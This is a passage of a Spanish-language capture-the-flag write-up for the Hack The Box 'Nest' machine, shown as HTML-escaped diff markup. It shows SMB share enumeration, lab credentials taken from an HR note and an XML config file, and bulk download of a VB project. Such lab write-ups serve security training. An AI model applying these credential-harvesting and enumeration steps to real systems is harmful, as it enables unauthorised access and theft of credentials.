+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;We would like to extend a warm welcome to our newest member of staff, &amp;lt;FIRSTNAME&amp;gt; &amp;lt;SURNAME&amp;gt;
+
+You will find your home folder in the following location: 
+&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;HTB-NEST&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\&amp;lt;&lt;/span&gt;USERNAME&amp;gt;
+
+If you have any issues accessing specific services or workstations, please inform the 
+IT department and use the credentials below &lt;span class=&#34;k&#34;&gt;until&lt;/span&gt; all systems have been &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; up &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; you.
+
+Username: TempUser
+Password: welcome2019
+
+
+Thank you
+HR
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;user---csmith&#34;&gt;USER - C.Smith&lt;/h2&gt;
+&lt;p&gt;Utilizamos las credenciales para enumerar los SHARENAME que estan disponibles en la maquina, en un directorio encontramos un archivo XML &lt;code&gt;RU_config.xml&lt;/code&gt; el cual contiene credenciales especificamente de &lt;strong&gt;C.Smith&lt;/strong&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.178&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Data
+smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;RU Scanner&amp;#34;&lt;/span&gt;
+smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:01:13 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 14:01:13 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  RU_config.xml                       A      &lt;span class=&#34;m&#34;&gt;270&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 13:49:37 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+
+		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449668&lt;/span&gt; blocks available
+smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get RU_config.xml 
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U Scanner&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U_config.xml of size &lt;span class=&#34;m&#34;&gt;270&lt;/span&gt; as RU_config.xml &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.2 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 3.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;RU_config.xml:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;ConfigFile&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;xmlns:xsd=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;nt&#34;&gt;&amp;lt;Port&amp;gt;&lt;/span&gt;389&lt;span class=&#34;nt&#34;&gt;&amp;lt;/Port&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;nt&#34;&gt;&amp;lt;Username&amp;gt;&lt;/span&gt;c.smith&lt;span class=&#34;nt&#34;&gt;&amp;lt;/Username&amp;gt;&lt;/span&gt;
+  &lt;span class=&#34;nt&#34;&gt;&amp;lt;Password&amp;gt;&lt;/span&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/Password&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/ConfigFile&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Tambien encontramos un proyecto que lleva el nombre de RU, para encontrar el directorio de Carl, enumeramos el SHARENAME Data en el cual encontramos un archivo xml en donde se describe un &amp;ldquo;archivo temporal&amp;rdquo; en &lt;code&gt;\Secure$\IT\Carl\Temp.txt&lt;/code&gt; el cual no existe.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;otepadPlusPlus&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:31:37 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:31:37 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  config.xml                          A     &lt;span class=&#34;m&#34;&gt;6451&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 17:01:25 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  shortcuts.xml                       A     &lt;span class=&#34;m&#34;&gt;2108&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 13:30:27 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+
+		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449680&lt;/span&gt; blocks available
+smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;otepadPlusPlus&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get config.xml
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;otepadPlusPlus&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;onfig.xml of size &lt;span class=&#34;m&#34;&gt;6451&lt;/span&gt; as config.xml &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;7.7 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 7.7 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigs&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;otepadPlusPlus&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
+root@aoiri:~/htb/nest# tail config.xml 
+        &amp;lt;Find &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;redeem on&amp;#34;&lt;/span&gt; /&amp;gt;
+        &amp;lt;Find &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;192&amp;#34;&lt;/span&gt; /&amp;gt;
+        &amp;lt;Replace &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C_addEvent&amp;#34;&lt;/span&gt; /&amp;gt;
+    &amp;lt;/FindHistory&amp;gt;
+    &amp;lt;History &lt;span class=&#34;nv&#34;&gt;nbMaxFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;15&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;inSubMenu&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;no&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;customLength&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-1&amp;#34;&lt;/span&gt;&amp;gt;
+        &amp;lt;File &lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\windows\System32\drivers\etc\hosts&amp;#34;&lt;/span&gt; /&amp;gt;
+        &amp;lt;File &lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;\\HTB-NEST\Secure&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;\IT\Carl\Temp.txt&amp;#34;&lt;/span&gt; /&amp;gt;
+        &amp;lt;File &lt;span class=&#34;nv&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Users\C.Smith\Desktop\todo.txt&amp;#34;&lt;/span&gt; /&amp;gt;
+    &amp;lt;/History&amp;gt;
+&amp;lt;/NotepadPlus&amp;gt;
+root@aoiri:~/htb/nest#
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Dicho Directorio nos llevo a encontrar el Proyecto RU.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Aug  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 08:47:41 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Tue Aug  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 08:47:41 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+  RU                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Aug  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 09:36:45 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
+
+		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449639&lt;/span&gt; blocks available
+smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; mask &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; recurse ON
+smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; prompt OFF
+smb: &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; mget *
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;onfigFile.vb of size &lt;span class=&#34;m&#34;&gt;772&lt;/span&gt; as ConfigFile.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2.2 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 2.2 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;odule1.vb of size &lt;span class=&#34;m&#34;&gt;279&lt;/span&gt; as Module1.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.8 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 1.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;pplication.Designer.vb of size &lt;span class=&#34;m&#34;&gt;441&lt;/span&gt; as Application.Designer.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.2 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 1.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;pplication.myapp of size &lt;span class=&#34;m&#34;&gt;481&lt;/span&gt; as Application.myapp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 1.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ssemblyInfo.vb of size &lt;span class=&#34;m&#34;&gt;1163&lt;/span&gt; as AssemblyInfo.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.9 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 1.6 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;esources.Designer.vb of size &lt;span class=&#34;m&#34;&gt;2776&lt;/span&gt; as Resources.Designer.vb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;7.8 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 2.5 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+getting file &lt;span class=&#34;se&#34;&gt;\I&lt;/span&gt;T&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;arl&lt;span class=&#34;se&#34;&gt;\V&lt;/span&gt;B Projects&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;IP&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;U&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;UScanner&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;y Project&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;esources.resx of size &lt;span class=&#34;m&#34;&gt;5612&lt;/span&gt; as Resources.resx &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9.3 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 3.9 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
